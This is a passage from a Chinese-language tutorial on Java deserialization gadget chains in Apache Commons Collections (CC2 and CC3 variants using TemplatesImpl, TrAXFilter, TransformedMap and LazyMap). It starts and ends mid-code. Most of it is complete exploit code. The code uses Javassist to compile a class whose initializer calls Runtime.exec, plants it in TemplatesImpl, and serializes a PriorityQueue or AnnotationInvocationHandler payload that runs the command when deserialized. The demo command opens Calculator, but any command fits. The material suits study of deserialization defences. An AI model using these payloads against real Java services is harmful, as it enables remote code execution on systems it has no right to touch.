    import java.io.ObjectOutputStream;
    import java.lang.reflect.Constructor;
    import java.lang.reflect.Field;
    import java.util.PriorityQueue;
    /**
     * @Author: H3rmesk1t
     * @Data: 2021/11/29 1:37 上午
     */
    public class CommonsCollectionsGadget2 {
        public static void CC2() throws NoSuchMethodException, IllegalAccessException, NoSuchFieldException, ClassNotFoundException, NotFoundException, CannotCompileException, IOException{
            Class c1 = Class.forName("org.apache.commons.collections4.functors.InvokerTransformer");
            Constructor constructor = c1.getDeclaredConstructor(String.class);
            constructor.setAccessible(true);
            Transformer transformer = new InvokerTransformer("newTransformer", new Class[]{}, new Object[]{});
            ClassPool classPool = ClassPool.getDefault();
            classPool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
            CtClass ctClass = classPool.makeClass("CommonsCollectionsEvilCode");
            ctClass.setSuperclass(classPool.get(AbstractTranslet.class.getName()));
            String shell = "java.lang.Runtime.getRuntime().exec(\"open -a /System/Applications/Calculator.app\");";
            ctClass.makeClassInitializer().insertBefore(shell);
            ctClass.writeFile("./");
            byte[] ctClassBytes = ctClass.toBytecode();
            byte[][] targetByteCodes = new byte[][]{ctClassBytes};
            TemplatesImpl templates = new TemplatesImpl();
            Class clazz = Class.forName("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl");
            Field _name = clazz.getDeclaredField("_name");
            Field _bytecode = clazz.getDeclaredField("_bytecodes");
            Field _tfactory = clazz.getDeclaredField("_tfactory");
            _name.setAccessible(true);
            _bytecode.setAccessible(true);
            _tfactory.setAccessible(true);
            _name.set(templates, "h3rmesk1t");
            _bytecode.set(templates, targetByteCodes);
            _tfactory.set(templates, new TransformerFactoryImpl());
            TransformingComparator transformingComparator = new TransformingComparator(transformer);
            PriorityQueue priorityQueue = new PriorityQueue(2);
            priorityQueue.add(1);
            priorityQueue.add(2);
            Class c2 = Class.forName("java.util.PriorityQueue");
            Field _queue = c2.getDeclaredField("queue");
            _queue.setAccessible(true);
            Object[] queue_array = new Object[]{templates,1};
            _queue.set(priorityQueue,queue_array);
            Field field = Class.forName("java.util.PriorityQueue").getDeclaredField("comparator");
            field.setAccessible(true);
            field.set(priorityQueue, transformingComparator);
            try {
                // 序列化操作
                ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("./CC2EvilGadget2.bin"));
                outputStream.writeObject(priorityQueue);
                outputStream.close();
                // 反序列化操作
                ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream("./CC2EvilGadget2.bin"));
                inputStream.readObject();
                inputStream.close();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
        public static void main(String[] args) {
            try {
                CC2();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }
###  调用链
    ObjectInputStream.readObject()
        PriorityQueue.readObject()
            PriorityQueue.heapify()
                PriorityQueue.siftDown()
                    PriorityQueue.siftDownUsingComparator()
                        TransformingComparator.compare()
                            InvokerTransformer.transform()
                                    Method.invoke()
                                        TemplatesImpl.newTransformer()
                                             TemplatesImpl.getTransletInstance()
                                             TemplatesImpl.defineTransletClasses
                                             newInstance()
                                                Runtime.exec()
###  总结
利用`PriorityQueue`在反序列化后会对队列进行优先级排序的特点，为其指定`TransformingComparator`排序方法，并在其中为其添加`Transforer`，与`CommonsCollections1`链类似，主要的触发位置还是`InvokerTransformer`。
## CommonsCollections3链
###  环境搭建
  1. `JDK`版本：JDK1.8u66（要求JDK8u71以下）
  2. `Commons-Collections`版本：3.1
利用`maven`来进行搭建，先创建一个`Maven`项目，不用选择任何`Maven`模板，`pom.xml`中内容如下，之后选择右侧的更新，让其自动导入包即可。
        4.0.0
        org.example
        commons-collections
        1.0-SNAPSHOT
                commons-collections
                commons-collections
                3.1
###  前置知识
**TrAXFilter**
这个类的构造函数中调用了`(TransformerImpl)
templates.newTransformer()`，免去了用`InvokerTransformer`手工调用`newTransformer()`方法。
**InstantiateTransformer**
上面虽然直接调用了`newTransformer()`，但是缺少了`InvokerTransformer`，`TrAXFilter`的构造方法也是无法调用的，因此这里利用`Commons-Collections`提供的`org.apache.commons.collections.functors.InstantiateTransformer`来通过反射创建类的实例，`transform()`方法接收一个`Class`类型的对象，通过`getConstructor()`来获取构造方法，并通过`newInstance()`创建类实例。
###  CommonsCollections3 分析
`CommonsCollections3`链其实是`CommonsCollections1`链和`CommonsCollections2`链的结合，为了绕过⼀些规则对`InvokerTransformer`的限制，`CommonsCollections3`并没有使⽤到`InvokerTransformer`来调⽤任意⽅法，根据上面的前置知识，可以利⽤`InstantiateTransformer()`来调⽤到`TrAXFilter()`的构造⽅法，再利⽤其构造⽅法⾥的`templates.newTransformer()`调⽤到`TemplatesImpl`⾥的字节码，这样就比避免使用`InvokerTransformer`。
    package CommonsCollections3;
    import java.io.*;
    import java.lang.*;
    import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
    import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
    import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
    import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
    import javassist.ClassClassPath;
    import javassist.ClassPool;
    import javassist.CtClass;
    import javassist.*;
    import org.apache.commons.collections.Transformer;
    import org.apache.commons.collections.functors.ChainedTransformer;
    import org.apache.commons.collections.functors.ConstantTransformer;
    import org.apache.commons.collections.functors.InstantiateTransformer;
    import org.apache.commons.collections.map.TransformedMap;
    import javax.xml.transform.Templates;
    import java.lang.reflect.Field;
    import java.util.HashMap;
    import java.util.Map;
    /**
     * @Author: H3rmesk1t
     * @Data: 2021/11/29 10:33 下午
     */
    public class TrAxFilterDemo {
        public static void trAxFilterDemo() throws IllegalAccessException, NoSuchFieldException, NotFoundException, CannotCompileException, IOException {
            ClassPool classPool = ClassPool.getDefault();
            classPool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
            CtClass ctClass = classPool.makeClass("Evil");
            ctClass.setSuperclass(classPool.get(AbstractTranslet.class.getName()));
            String shell = "java.lang.Runtime.getRuntime().exec(\"open -a /System/Applications/Calculator.app\");";
            ctClass.makeClassInitializer().insertBefore(shell);
            byte[] shellCode = ctClass.toBytecode();
            byte[][] targetByteCode = new byte[][]{shellCode};
            TemplatesImpl templates = new TemplatesImpl();
            Class c1 = templates.getClass();
            Field _name = c1.getDeclaredField("_name");
            Field _bytecode = c1.getDeclaredField("_bytecodes");
            Field _tfactory = c1.getDeclaredField("_tfactory");
            _name.setAccessible(true);
            _bytecode.setAccessible(true);
            _tfactory.setAccessible(true);
            _name.set(templates, "h3rmesk1t");
            _bytecode.set(templates, targetByteCode);
            _tfactory.set(templates, new TransformerFactoryImpl());
            Transformer[] transformers = new Transformer[] {
                    new ConstantTransformer(TrAXFilter.class),
                    new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates})
            };
            ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
            Map innerMap = new HashMap();
            Map outerMap = TransformedMap.decorate(innerMap, null, chainedTransformer);
            outerMap.put("d1no", "web");
        }
        public static void main(String[] args) {
            try {
                trAxFilterDemo();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }
**TransformedMap**
    package CommonsCollections3;
    import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
    import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
    import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
    import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
    import javassist.*;
    import org.apache.commons.collections.Transformer;
    import org.apache.commons.collections.functors.ChainedTransformer;
    import org.apache.commons.collections.functors.ConstantTransformer;
    import org.apache.commons.collections.functors.InstantiateTransformer;
    import org.apache.commons.collections.map.TransformedMap;
    import javax.xml.transform.Templates;
    import java.io.*;
    import java.lang.annotation.Retention;
    import java.lang.reflect.Constructor;
    import java.lang.reflect.Field;
    import java.lang.reflect.InvocationTargetException;
    import java.util.HashMap;
    import java.util.Map;
    /**
     * @Author: H3rmesk1t
     * @Data: 2021/11/29 9:38 下午
     */
    public class CommonsCollections3TransformedMap {
        public static void CC3() throws NotFoundException, CannotCompileException, IOException, IllegalAccessException, NoSuchFieldException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException {
            ClassPool pool = ClassPool.getDefault();
            pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
            CtClass ctClass = pool.makeClass("Evil");
            ctClass.setSuperclass(pool.get(AbstractTranslet.class.getName()));
            String shell = "java.lang.Runtime.getRuntime().exec(\"open -a /System/Applications/Calculator.app\");";
            ctClass.makeClassInitializer().insertBefore(shell);
            byte[] shellByteCode = ctClass.toBytecode();
            byte[][] targetByteCode = new byte[][]{shellByteCode};
            TemplatesImpl obj = new TemplatesImpl();
            Class _class = obj.getClass();
            Field _name = _class.getDeclaredField("_name");
            Field _bytecode = _class.getDeclaredField("_bytecodes");
            Field _tfactory = _class.getDeclaredField("_tfactory");
            _name.setAccessible(true);
            _bytecode.setAccessible(true);
            _tfactory.setAccessible(true);
            _name.set(obj, "h3rmesk1t");
            _bytecode.set(obj, targetByteCode);
            _tfactory.set(obj, new TransformerFactoryImpl());
            Transformer[] transformers = new Transformer[] {
                    new ConstantTransformer(TrAXFilter.class),
                    new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{obj})
            };
            ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
            Map map = new HashMap();
            map.put("value", "d1no");
            Map map1 = TransformedMap.decorate(map, null, chainedTransformer);
            Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
            Constructor constructor = c.getDeclaredConstructor(Class.class, Map.class);
            constructor.setAccessible(true);
            Object object = constructor.newInstance(Retention.class, map1);
            try {
                // 序列化
                ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
                ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
                objectOutputStream.writeObject(object);
                objectOutputStream.close();
                // 反序列化
                ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(byteArrayOutputStream.toByteArray());
                ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);
                objectInputStream.readObject();
                objectInputStream.close();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
        public static void main(String[] args) {
            try {
                CC3();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }
**LazyMap**
    package CommonsCollections3;
    import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
    import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
    import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
    import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
    import javassist.*;
    import org.apache.commons.collections.Transformer;
    import org.apache.commons.collections.functors.ChainedTransformer;
    import org.apache.commons.collections.functors.ConstantTransformer;
    import org.apache.commons.collections.functors.InstantiateTransformer;
    import org.apache.commons.collections.map.LazyMap;